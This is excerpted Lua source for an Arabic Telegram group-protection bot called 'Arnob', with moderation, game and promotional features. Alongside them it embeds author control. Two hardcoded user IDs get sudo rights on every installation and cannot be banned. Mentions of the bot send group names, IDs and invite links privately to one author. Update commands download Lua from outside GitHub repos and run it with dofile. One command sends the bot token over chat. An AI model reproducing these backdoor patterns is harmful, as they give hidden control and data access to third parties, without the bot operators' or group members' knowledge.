...
if res ~= 200 then
print('\27[0;31m━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━ ━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━"
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/surceBemBo/D/main/File_Bot/commands.lua") 
...
dev_users = {5521078709,5054546767}   
...
sudo_users = {SUDO,5521078709,5054546767}   
...
if tonumber(user_id) == tonumber(5521078709) then  
var = true 
elseif tonumber(user_id) == tonumber(5054546767) then
var = true  
...
if tonumber(user_id) == tonumber(5521078709) then  
var = 'المــــبــــرمـج افـــيـونا︎'
elseif tonumber(user_id) == tonumber(5054546767) then
var = 'الــمـــــبــــــرمـج نـــادر'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif bot_data:sismember(bot_id.."Dev:ban:2", user_id) then
var = "المطور الثانوي"  
...
local UserName = (data.username_ or "l_YT_l")
...
--------------------------------------------------------------------------------------------------------------
function l_YT_l(msg,data) -- بداية العمل
if msg then
...
if textchuser then
send(msg.chat_id_, msg.id_,'['..l_YT_l..']')
else
...
local Namebot = (bot_data:get(bot_id..'Name:Bot') or 'ارنوب') 
local DRAGON_Msg = { 
'ــــــــــــــــــــــــــــــــــــــــــــــ\n  🐥 أهلآ بك عزيزي أنا بوت  '..Namebot..'\n٭♡ وظيفتي حماية المجموعات\n٭♡ لتفعيل البوت عليك اتباع مايلي \n٭♡ أضِف البوت إلى مجموعتك\n🤷‍♂️ ارفعهُ » مشرف\n👑⚡م ترقيتك مالك في البوت\nــــــــــــــــــــــــــــــــــــــــــــــــــــ ', } 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'حـول🐥', callback_data="/change-hhh"},{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ', callback_data="/change-siusr"},
},
{
{text = 'الابــــراج', callback_data="/zDRGd"},{text = 'الالـعـاب🐥', callback_data="/add"},
},
{
{text = 'ძᎥ᥎', url="http://t.me/"..sudos.UserName},
},
{
...
os.execute('wget https://raw.githubusercontent.com/VamBIR/n/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ٭ تم تحديث سورس ارنـــــوب')
dofile('DRAGON.lua')  
end
...
send(msg.chat_id_, msg.id_,' ٭ اصدار سورس ارنـــوب{ S:1✓}')
end
if text == '⇣───♡٭قـناه المطورين٭♡───⇣' then
local Text = [[ 
قناه مطورين السورس 🍂〢
محتاج تنصب بوت حمايه  تواصل معنا ✓
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'السورس', url="t.me/l_YT_l"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
bot_data:del(bot_id..'Srt:Bot') 
local Text = [[ 
[᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ ](t.me/l_YT_l)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
send(msg.chat_id_, msg.id_,'هذا الامر خاص ب افيونا فقط')
return false
end
local msg_id = msg.id_/2097152/0.5 
...
bot_data:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ٭ من أحسن السورسات على التليجرام سورس ارنــوب ٭
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/29&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
usertext = '\n ٭ الـعـضو   ٭ ['..result.title_..'](t.me/'..(username or 'l_YT_l')..')'
status  = '\n ٭ تم ترقيته مطور'
...
usertext = '\n ٭ الـعـضو   ٭ ['..data.first_name_..'](t.me/'..(data.username_ or 'l_YT_l')..')'
status  = '\n ٭ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ٭ الـعـضو   ٭ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'l_YT_l')..') \n ٭ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text and text:match("^ارنوب$") or text and text:match("^افيونا$") or text and text:match("^afyona$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(5521078709,"٭. هناك شخص يريدك يا سيدي افيونا \n٭الشخص  {"..Name.."}\n٭اسم الجروب {"..NameChat.."}\n٭ايدي الجروب { `"..msg.chat_id_.."` }\n٭رابط الجروب \n [ "..LinkGroup.." ]\n    ٭رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
print("it is Bot")
N = (bot_data:get(bot_id.."Name:Bot") or "ارنوب")
...
send(msg.chat_id_,0," ٭ الـعـضو  : {["..data.first_name_.."](T.ME/l_YT_l)}\n ٭ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ٭ عذرا  ٭ {["..data.first_name_.."](T.ME/l_YT_l)}\n ٭ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l25&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{{text = 'ხ︎᥆ძꪗ ხ︎ᥲ️︎᥉𝗁︎', url="t.me/B_O_7D_Y7"}},
{{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎', url="t.me/l_03_l177BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/l_YT_l/25&caption='  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'يوزر افيونا' or text == 'فيونا' or text == 'نادر' or text == 'سورس افيونا' then
local Text = [[
٭يــوزر افـيونا مبــــرمج السورس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_03_l"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/youtubeVPlllllllllllbot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'افيونا' or text == 'afyona' or text == 'المبرمج' then
local Text = [[
اتـــــبـــع الزرايـر بلاسفــل
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Aƒꪗ᥆ꪀᥲ️︎ ხ︎ᥲ️︎᥉𝗁︎',url="t.me/l_03_l"}},
{{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ' , callback_data="/Ajobanf"},{text = '᥉ρ᥆ɾƚ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎', callback_data="/banfai"}},  
{{text = '•البــــوتــات', callback_data="/gqjik"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_03_l80&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == "🕴تتم" and Developers(msg) then
...
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'هذا الامر خاص بــفمـبــير فقط')
return false
end
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
...
local Text = [[ 
[᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ](t.me/l_YT_l)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'البـــــوتـــــات', url="t.me/l_03_l80"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/28&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━' then
local Text = [[ 
  ٭من أحسن السورسات على التليجرام سورس ارنــــوب
٭بجد سورس أمان جدا وفي مميزات جامده٭
٭تع نصب بوتك عندنا يلا واستمتع بالمميزات٭
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ', url="t.me/l_YT_l"}},{{text = '˹الــتــواصــل٭˼', url="t.me/Vpllllllllllllllllllbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/29&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹الــتــواصــل٭˼', url="t.me/Vpllllllllllllllllllbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/30&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب ارنوب' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ٭ اهلا في قائمه الالعاب المتطوره سورس ارنوب ٭ 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/25&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--------------------------------------------------------------------------------------------------------------
...
if tonumber(result.sender_user_id_) == tonumber(5521078709) then  
send(msg.chat_id_, msg.id_, " ٭ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(5054546767) then  
send(msg.chat_id_, msg.id_, " ٭ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(5521078709) then
send(msg.chat_id_, msg.id_, " ٭ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(5054546767) then
send(msg.chat_id_, msg.id_, " ٭ لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n ٭ الـعـضو   ٭ ['..result.title_..'](t.me/'..(username or 'l_YT_l')..')'
...
if tonumber(userid) == tonumber(5521078709) then  
send(msg.chat_id_, msg.id_, " ٭ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(5054546767) then  
send(msg.chat_id_, msg.id_, " ٭ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'l_YT_l')..')'
...
send(msg.chat_id_, msg.id_, '٭  مـن قبـل  ٭ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'l_YT_l')..') \n٭ تم تفعيل التنظيف التلقائي ')
return false
end
...
if text == "بص افيونا بيعمل ايه" and SudoBot(msg) then 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ٭ تم تعطيل جلب الصوره ،\n ٭ تم قفل البوتات  ،\n ٭ تم قفل التكرار ،\n ٭ تم قفل الروابط ،\n ٭ تم قفل التوجيه ،\n ٭ تم قفل الملصقات ،\n ٭ تم قفل المتحركه ،\n ٭ تم قفل الفيديو ،\n ٭ تم قفل الفشار ،\n ٭ تم قفل الانلاين ،\n ٭ تم قفل تعديل المديا ،\n ٭ تم وضع التكرار  ،\n ٭ تم قفل الفارسيه  ،\n ٭ تم وضع الايدي بدون صوره ،n  \n ٭ تم تفعيل الحمايه  بواسطه ، ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'l_YT_l')..')  ')
end,nil)   
end
...
bot_data:del(bot_id..'ghiktr'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الحمايه القصوي من قبل    ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'l_YT_l')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ٭  مـن قبـل  ٭ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'l_YT_l')..') \n ٭ تـم قفـل التاك بالكتم ')
end,nil)   
...
if Devban(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/VamBIR/n/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ٭ اهلا بك في متجر ملفات افيونا\n ٭ ملفات السورس ↓\n━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━\n\n"
local TextE = "\n━═━═━═━᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ═━═━═━\n ٭ علامة تعني { ✔️ } ملف مفعل\n ٭ علامة تعني { ✖ } ملف معطل\n ٭ قناة سورس ارنوب\n".." ٭ [اضغط هنا لدخول](t.me/l_YT_l) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/VamBIR/n/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ٭ عذرا الملف لايدعم سورس ارنوب\n") 
end
return false
end
...
if text == ("رفع ارنوب") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
...
if text and text:match("^رفع ارنوب @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع ارنوب @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"٭ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
if text and text:match("^رفع ارنوب (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع ارنوب (%d+)$")
bot_data:del(bot_id.."msa3d:ban")
...
if text == ("تنزيل ارنوب") and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
local id = bot_data:get(bot_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply","٭ تم تنزيله من ارنوب")  
bot_data:del(bot_id.."msa3d:ban")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ٭ لعضو  ٭ ['..data.first_name_..'](t.me/'..(data.username_ or 'l_YT_l')..')'
status  = '\n ٭ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ٭ الـعـضو   ٭ '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ٭ العضــو  ٭ ['..data.first_name_..'](t.me/'..(data.username_ or 'l_YT_l')..')'
...
usertext = '\n ٭  المستخدم  ٭ ['..result.title_..'](t.me/'..(username or 'l_YT_l')..')'
status  = '\n ٭ تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
bot_data:set(bot_id.."ban:TRGMA"..msg.chat_id_,"close")
end
if text == "تفعيل الترجمه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'٭تم تفعيل الترجمه')
bot_data:set(bot_id.."ban:TRGMA"..msg.chat_id_,"open")
end

if text and text:match("^ترجمه (.*)$") and bot_data:get(bot_id.."ban:TRGMA"..msg.chat_id_) == "open" then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ٭ الـعـضو   ٭ ['..result.title_..'](t.me/'..(text1[3] or 'l_YT_l')..')'..'\n ٭ تم رفعه '..text1[2]..'')   
bot_data:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(bot_data:get(bot_id..'Name:Bot') or 'ارنوب').."" then  
Namebot = (bot_data:get(bot_id..'Name:Bot') or 'ارنوب')
local DRAGON_Msg = {
'ااي يبنلوتكه 💕',
'نعم يا قلبي  '..Namebot..' قول',
...
--------------
if text == ""..(bot_data:get(bot_id..'Name:Bot') or 'ارنوب').." غادر" or text == 'غادر' and Sudo(msg) then     
...
keyboard.inline_keyboard = {
{
{text = '𝐒𝐎𝐔𝐑𝐂𝐄  𝐕𝘼𝙈𝘽𝙄𝙍', url = "https://t.me/l_YT_l"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ', url="t.me/SOURCEDRAGON"}},
}
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/l_YT_l/26&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard.inline_keyboard = {
{{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_03_l177BOT"}},
{{text = 'ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_03_l"}}, 
...
keyboard.inline_keyboard = {
{{text = 'ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_03_l"}},
{{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ',url="t.me/l_YT_l"},{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎', url="t.me/l_03_l177BOT"}},
{{text = 'الـــمــطور', url="http://t.me/"..sudos.UserName}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/bnada-yquio' then
local Teext =[[
الــمــبــرمــــج افيونا اتــبــع الــزرايــر بــلاســفــل⬇️ 

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_03_l"}},
{{text = 'ᥴ︎𝗁︎ᥲ️︎ꪀᥱ︎ꪶ', callback_data="/Ajobanf"},{text = 'ƚᥱ︎ꪔ ᥱ︎ꪶᥲ️︎ƚᥲ️︎ꪝꪶᥲ️︎', callback_data="/banfai"}},  
{{text = 'البـــوتـات', callback_data="/gqjik"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Ajobanf' then
local Teext =[[
الــمــبــرمــــج افــــيونا اتــبــع الــزرايــر بــلاســفــل⬇️ 

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '٭ ˹᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ˼',url="t.me/l_YT_l"}},{{text = 'ƚꪝᥲ️︎᥉᥆ꪶ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎︎',url="t.me/l_03_l177BOT"}},
...
if Text == '/banfai' then
local Teext =[[
اتــــبـــع الـــزرايـر 
بلاسـفـل⚡

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥉ρ᥆ɾƚ ᥲ️︎ƒꪗ᥆ꪀᥲ️︎',url="t.me/l_lpl_l"}},
{{text = '٭𝙱𝙰𝙲𝙺↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/gqjik' then
local Teext =[[
لأســتــخــدام بــوتــات الــمــبــرمــــج اتــبــع الــزرايــر بــلاســفــل⬇️

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ხ︎᥆ƚ ᥎ᥱ︎ꪀ᥆ꪔ',url="t.me/VPllllllbot"}},{{text = 'دعم قنوات↝ᵇᵒᵗ ♪',url="t.me/VENOM1_Bot"}},
{{text = 'ხ︎᥆ƚ ᥲ️︎ɾꪀ᥆ρ',url="t.me/A_Rn_obot"}},{{text = 'ხ︎᥆ƚ ƚꪶᥱ︎ძɾᥲ️︎ƒ ꪔᥱ︎ძᎥᥲ️︎',url="t.me/l_YT_l_BOT"}},
{{text = '٭𝙱𝙰𝙲𝙺↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ꪔꪗ ძ᥎', callback_data="/units"},{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ', callback_data="/theytry"}},   
...
الاعمال الملائمة : أطباء، صيادلة، مدرفيونا، أخصائيو تغذية، شيف، سماسرة
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥉᥆uɾᥴ︎ᥱ︎ ᥲ️︎ɾꪀ᥆ρ',url='http://t.me/l_YT_l'}},
}
...
local Name_Bot = (bot_data:get(bot_id..'Name:Bot') or 'ارنوب')
...
"صراحه  |  ااي رايك ف ارنوب",
"صراحه  |  هل انت بتحب افيونا ؟",
